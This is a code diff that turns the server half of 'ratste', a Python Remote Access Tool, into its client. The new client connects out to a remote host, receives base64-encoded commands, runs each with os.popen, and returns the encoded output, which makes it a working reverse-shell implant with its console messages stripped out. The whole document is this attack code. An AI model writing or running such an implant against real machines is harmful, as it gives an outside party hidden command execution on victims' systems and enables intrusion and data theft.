@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """ 
-ratste's server component.
+ratste's client component.
 
 ratste is a general purpose Remote Access Tool written in Python3.
 
@@ -22,56 +22,47 @@ __author__ = "https://github.com/StefanoRatto/"
 __license__ = "GPLv3"
 __version__ = "1.0.0"
 
+import os
 import socket
 import sys
+import base64
 
 try:
-    LHOST = str(sys.argv[1])
-    LPORT = int(sys.argv[2])
+    RHOST = str(sys.argv[1])
+    RPORT = int(sys.argv[2])
 except:
-    print 'ratste > usage: ./ratste_server.py <local_ip> <local_port>'
     #sys.exit(1)
-    print 'ratste > using default host (127.0.0.1) and port (7261)' 
-    LHOST = '127.0.0.1'
-    LPORT = 7261
+    RHOST = '127.0.0.1'
+    RPORT = 7261
 
 def main():
     
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind((LHOST, LPORT))
-        s.listen(10)
+        s = socket.socket()
+        s.connect((RHOST, RPORT))
     except:
-        print 'ratste > network error, exiting...'
         sys.exit(1)
 
-    print 'ratste > server listening on {}:{}'.format(LHOST, LPORT)
-    print 'ratste > type "quit" or ctrl-c to exit'
-
-    conn, _ = s.accept()
-
-    conn.send('hostname')
-    client = conn.recv(4096).rstrip()
-    
-    print 'ratste > check-in by {}'.format(client)
-
     while True:
-        cmd = raw_input('ratste@{} > '.format(client)).rstrip()
+        data = s.recv(1024)
+        #cmd = data
 
-        # allow noop
-        if cmd == '':
-            continue
+        data_bytes = data.encode('ascii')
+        cmd_bytes = base64.b64decode(data_bytes)
+        cmd = cmd_bytes.decode('ascii')
 
-        # send command to client
-        conn.send(cmd)
-
-        # stop server
+        # stop client
         if cmd == 'quit':
             s.close()
             sys.exit(0)
 
-        data = conn.recv(4096)
-        print data
+        results = os.popen(cmd).read()
+        
+        results_bytes = results.encode('ascii')
+        data_bytes = base64.b64encode(results_bytes)
+        data = data_bytes.decode('ascii')
+
+        s.sendall(data)
 
 if __name__ == '__main__':
     main()
